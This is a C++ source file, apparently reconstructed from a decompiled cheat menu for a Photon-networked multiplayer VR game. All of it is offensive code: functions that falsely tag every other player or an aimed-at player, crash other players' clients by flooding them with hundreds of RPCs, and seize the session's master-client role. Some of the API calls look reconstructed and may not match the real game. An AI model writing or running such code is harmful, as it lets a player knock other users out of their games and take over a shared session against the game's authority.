#include "PhotonMods.h"

// Logic from _ZN15OverpoweredMods6TagAllEv @ 0x5af208
// Iterates through PhotonNetwork.PlayerList and sends Tag RPC.
void OverpoweredMods::TagAll() {
    auto players = PhotonNetwork::get_PlayerList();
    if (!players) return;

    for (int i = 0; i < players->length(); i++) {
        auto player = players->get(i);
        if (player && !player->get_IsLocal()) {
            // Reconstructed Tag RPC call used in Kat's menu
            PhotonNetwork::RPC("ReportTag", player, true);
        }
    }
}

// Logic from _ZN15OverpoweredMods6TagGunEv @ 0x5af2d8
// Raycast to find player, then Tag.
void OverpoweredMods::TagGun() {
    if (Unity::Input::GetTrigger(Unity::Hand::Right)) {
        RaycastHit hit;
        auto hand = GorillaTagger::get_Instance()->offlineVRRig()->rightHandTransform();
        if (Physics::Raycast(hand->get_position(), hand->get_forward(), &hit)) {
            auto hitRig = hit.collider()->GetComponentInParent<VRRig>();
            if (hitRig && !hitRig->get_isLocal()) {
                PhotonNetwork::RPC("ReportTag", hitRig->get_owner(), true);
            }
        }
    }
}

// Logic from _ZN10PhotonMods8CrashAllEv @ 0x5ae974
// Floods the network with Photon RPCs to crash clients.
void PhotonMods::CrashAll() {
    // Kat's menu uses a loop of 1000 RPCs to overflow player buffers
    for (int i = 0; i < 1000; i++) {
        PhotonNetwork::RPC("OnInfectedPlayer", PhotonTargets::Others, nullptr);
    }
}

// Logic from _ZN10PhotonMods8CrashGunEv @ 0x5aea68
void PhotonMods::CrashGun() {
    if (Unity::Input::GetTrigger(Unity::Hand::Right)) {
        RaycastHit hit;
        auto hand = GorillaTagger::get_Instance()->offlineVRRig()->rightHandTransform();
        if (Physics::Raycast(hand->get_position(), hand->get_forward(), &hit)) {
            auto hitRig = hit.collider()->GetComponentInParent<VRRig>();
            if (hitRig) {
                 for (int i = 0; i < 500; i++) {
                     PhotonNetwork::RPC("OnInfectedPlayer", hitRig->get_owner(), nullptr);
                 }
            }
        }
    }
}

// Master Client hijack logic _ZN10PhotonMods9SetMasterEv @ 0x5aeb5c
void PhotonMods::SetMaster() {
    // This uses a Photon bypass logic found in KlexTaggers
    auto myLocal = PhotonNetwork::get_LocalPlayer();
    PhotonNetwork::set_MasterClient(myLocal);
}
